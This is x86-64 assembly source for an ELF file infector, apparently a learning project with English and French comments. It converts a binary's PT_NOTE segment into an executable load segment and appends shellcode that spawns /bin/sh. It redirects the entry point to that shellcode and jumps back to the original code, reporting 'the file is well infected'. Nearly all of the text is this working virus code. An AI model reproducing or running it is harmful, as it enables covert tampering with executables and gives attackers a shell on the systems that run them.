section .data

	buf times 4 db 0            ; Buffer for the 4 first bytes
	ELF_numbers db 0x7F, 0x45, 0x4C , 0x46  
	is_ELF_msg db "The file is an ELF file.", 0xA, 0   ;0xA is for line break
	not_ELF_msg db "error, the file printed is not an ELF file.", 0xA, 0
	error_msg db "The programm returned an error", 0xA, 0
	error_msg_args db "error, only one argument is needed. Syntax : ./infector file", 0xA, 0
	error_msg_file db "error, the file printed is a folder. Please enter an ELF file.", 0xA, 0
	success_msg db "Bravo, the file is well infected", 0xA, 0



    payload_buffer: 
        db 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb0, 0x3b, 0x0f, 0x05, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0xe9
    jmp_offset dd 0  

    payload_size equ 41  ; Correction de la taille du payload (41 au lieu de 42)

section .bss 

	stat_buff resb 144 ;reserve bytes(saving space) (144bytes) for the fstat command later
	ELF_header_buff resb 64 ;save space to read and parse the ELF header
	program_header_buff resb 56 ;idem for the program header 
	
    phoff resq 1       ; reserve quadword = 4 times a word size = 8 bytes / save space to store the memory address for the beginning of the program headers
	current_phoff resq 1   ; to loop on all the programm headers

    phnum resw 1       ; reserve word = 2 times a word size = 2 bytes

	filename resb 256
	fd resd 1       ; to save the file descriptor later 
	
	payload_len resq 1  ; Réserve 8 octets pour payload_len

    last_load_end resq 1   ; Fin du dernier segment LOAD
    current_save resq 1    ; Pour scanner les segments
    temp_header resb 56    ; Buffer temporaire pour les headers


section .text
    global _start

_start:

	mov rdi, [rsp]          ; get argc
	cmp rdi, 2              ; argc must be equal to 2 (name of the program + first argument) 
	jne wrong_args 
	mov rsi, [rsp +16]    ; getting the first argument 
	mov rdi, filename    ; filename buffer in rdi 
	call copy_string 
	call main
	call exit_program


wrong_args:
    mov rsi, error_msg_args  
    mov rdx, 61
    call print_message
    mov rax, 60
    mov rdi, 1
    syscall


main: 

    mov rax, payload_size
    mov [payload_len], rax

    call stat_file	
    call check_if_regular_file
    call check_elf
	call parse_elfheader
	call parse_programm_header
    call close_file
    ret



stat_file:
    mov rax, 4      ; sys_stat
    mov rdi, filename
    mov rsi, stat_buff
    syscall
    test rax, rax
    js error
    ret


	
check_if_regular_file:
    mov rax, [stat_buff + 24]  ; load st_mode (16 bytes in the stat structure)
    and rax, 0xF000            ; mask to isolate the mask type bites (the "file type" bytes are located in the first 4 bytes) 
    cmp rax, 0x8000            ; 0x8000 = S_IFREG (regular file)
    je is_regular_file
    
    mov rsi, error_msg_file
    mov rdx, 63
    call print_message
    jmp exit_program

is_regular_file:
	ret


check_elf:
	; Open the file
	mov rax, 2      ; sys_open
	mov rdi, filename
	mov rsi, 2      ; read-write
	syscall
	test rax, rax
	js error
	mov [fd], rax    ; Save file descriptor


	; read the first 4 bytes in the file 
	mov rdi, [fd]
	mov rax, 0                   ; sys_read 
	mov rsi, buf                 
	mov rdx, 4                   ; 4 octets read	
	syscall
	test rax, rax
	js error
	
	mov rcx, 4                   ; for the loop 
	xor rdi, rdi     
	
	call compare_loop
	
	mov rsi, is_ELF_msg
	mov rdx, 25   
	call print_message  
	ret
	

compare_loop: 
	;verify file magic bytes
	mov al, [buf + rdi]
	cmp al, [ELF_numbers + rdi]
	jne not_ELF
	inc rdi
	dec rcx
    jnz compare_loop
	ret

not_ELF:
	;Print that the file is not an ELF
	mov rsi, not_ELF_msg
	mov rdx, 44
	call print_message
	jmp exit_program 




close_file:		
	mov rdi, [fd]  
	mov rax, 3      ;sys_close 
	syscall        
	ret



copy_string:
    mov al, [rsi]       
    mov [rdi], al      
    test al, al        ; check if the caracter is null
    je copy_done       
    inc rsi             
    inc rdi           
    jmp copy_string     

copy_done:
    ret  
    
    


;_______________________Parsing structures 

parse_elfheader:

    ; set ourselves at the beginning of the file (we read the 4 magic bytes before)
    mov rax, 8          
    mov rdi, [fd]       
    mov rsi, 0          ; offset 0
    mov rdx, 0        
    syscall
    test rax, rax
    js error

	mov rax, 0
	mov rdi, [fd]
	mov rsi, ELF_header_buff
	mov rdx, 64 ;number of bytes to read
	syscall
	test rax, rax
	js error

	mov rax, [ELF_header_buff + 0x20]   ;read 8 bytes 
	mov [phoff], rax

	movzx rax, word[ELF_header_buff + 0x38]   ; movzx : fills the superior bytes of the rax with 0 to ensure its the good value
	mov [phnum], rax


	ret




parse_programm_header:

  	mov rcx, [phnum]              ; number of program headers
    mov rax, [phoff]              ; offset to programm headers
    mov [current_phoff], rax

	jmp parse_loop

parse_loop:
	;save rcx in the stack
	push rcx

	pop rcx

	test rcx, rcx
	jz end_parse

    ; lseek : to place ourselves at the current offset
	mov rax, 8              
	mov rdi, [fd]
	mov rsi, [current_phoff]
	mov rdx, 0
	syscall 
	test rax, rax
	js error
	
	; read program header 
	mov rax, 0        
	mov rdi, [fd]
	mov rsi, program_header_buff
	mov rdx, 56	
	syscall
	test rax, rax
	js error


    ; Check if segment is PT_NOTE
	mov eax, [program_header_buff]     ; grabbing the 4 first bytes 
	cmp eax, 0x00000004                ; check if PT_NOTE
	je pt_note_found


    ; Move to next program header
    add qword [current_phoff], 56
    dec rcx
    jmp parse_loop


end_parse:
	ret 
	

pt_note_found:

    ; Find the end of last LOAD segment to place our payload
    mov r15, [current_phoff]       ; Save PT_NOTE offset for later modification

    ; Find the end of last LOAD segment to place our payload
    mov qword [last_load_end], 0
    mov rcx, [phnum]
    mov rax, [phoff]
    mov [current_save], rax

scan_load_segments:
    push rcx
    push rax
    
    ; Read header
    mov rax, 8              
    mov rdi, [fd]
    mov rsi, [current_save]
    mov rdx, 0
    syscall

    mov rax, 0        
    mov rdi, [fd]
    mov rsi, temp_header
    mov rdx, 56
    syscall

    ; Check if LOAD segment
    mov eax, [temp_header]
    cmp eax, 1    ; PT_LOAD
    jne next_load_seg

    ; Calculate end of this segment in memory
    mov rax, [temp_header + 16]   ; p_vaddr
    add rax, [temp_header + 32]   ; + p_filesz
    add rax, 0x1000              ; Add page margin
    and rax, ~0xFFF             ; Page align
    cmp rax, [last_load_end]
    jle next_load_seg
    mov [last_load_end], rax

next_load_seg:
    pop rax
    add rax, 56
    mov [current_save], rax
    pop rcx
    dec rcx
    jnz scan_load_segments

    ; Calculate new virtual address for payload
    mov r13, [last_load_end]     ; get end of the last segment
    add r13, 0x1000              ; add margin 
    and r13, ~0xFFF              ; align 

    ; Get EOF and align it 
    mov rax, 8              
    mov rdi, [fd]
    mov rsi, 0
    mov rdx, 2              
    syscall
    mov r12, rax            

    ; Save original entry point 
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, 24                     
    mov rdx, 0                      
    syscall

    mov rax, 0                      
    mov rdi, [fd]
    mov rsi, ELF_header_buff + 24   
    mov rdx, 8
    syscall
    mov rbx, [ELF_header_buff + 24]  ; Original entry in rbx

   ; Calculate the new closest virtual address
    mov r13, [last_load_end]        ; base : after the last load segment
    add r13, 0x1000                 ; one page gat is enough
    and r13, ~0xFFF                ; align page


	; Aligne the file offset
    mov rax, r12                    ; EOF
    add rax, 0xFFF                  ; round to the superior page
    and rax, ~0xFFF                 ; align
    mov r12, rax                    ; Save EOF aligned


    ; Save new e_entry address
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, 24                     
    mov rdx, 0                      
    syscall

    mov rax, r13                    
    mov [ELF_header_buff + 24], rax  ; Update e_entry
    
    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, ELF_header_buff + 24
    mov rdx, 8
    syscall

    ; Convert PT_NOTE to PT_LOAD
    mov dword [program_header_buff], 1          ; PT_LOAD
    mov dword [program_header_buff + 4], 5      ; RX flags
    mov qword [program_header_buff + 8], r12    ; p_offset : EOF
    mov qword [program_header_buff + 16], r13   ; p_vaddr
    mov qword [program_header_buff + 24], r13   ; p_paddr


    mov rax, payload_size
    add rax, 0xFFF
    and rax, ~0xFFF
    mov qword [program_header_buff + 32], rax   ; p_filesz
    mov qword [program_header_buff + 40], rax   ; p_memsz
    mov qword [program_header_buff + 48], 0x1000 ; p_align

     ; Calculate return jmp 
    mov rax, rbx                    ; Original entry
    sub rax, r13                    ; sub new base
    sub rax, payload_size           ; Sub payload size
    sub rax, 5                      ; ajust size bc of jmp instruction
    mov [jmp_offset], eax           ; save offset


    ; Write payload at EOF
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, r12                    
    mov rdx, 0                      
    syscall
	test rax, rax                   
    js error


    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, payload_buffer
    mov rdx, payload_size           
    syscall
    cmp rax, payload_size          
    jne error                     

    ; write offset return 
    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, jmp_offset
    mov rdx, 4                      
    syscall
    cmp rax, 4                     
    jne error

    ; Write modified header
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, r15                    ; PT_NOTE offset previously saved
    mov rdx, 0                      
    syscall

    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, program_header_buff
    mov rdx, 56                     
    syscall

    ; Update ELF header sections
    mov rax, [ELF_header_buff + 40]    ; e_shoff
    cmp rax, r12                       
    jbe no_shoff_update
    add rax, payload_size
    mov [ELF_header_buff + 40], rax
    
    mov rax, 8                      
    mov rdi, [fd]
    mov rsi, 0                     
    mov rdx, 0                      
    syscall

    mov rax, 1                      
    mov rdi, [fd]
    mov rsi, ELF_header_buff
    mov rdx, 64                     
    syscall

no_shoff_update:
    mov rsi, success_msg
    mov rdx, 33
    call print_message
    ret
    
print_message:
    mov rax, 0x1               
    mov rdi, 1                 
    syscall
    ret

exit_program:
	mov rax, 60                  
	xor rdi, rdi                
	syscall


error:
	; Handle errors (Print & exit) 
	mov rax, 0x1
	mov rdi, 1 
	mov rsi, error_msg
	mov rdx, 31
	syscall
	mov rax, 60                 
	mov rdi, 1                    ; Exit code 1
	syscall
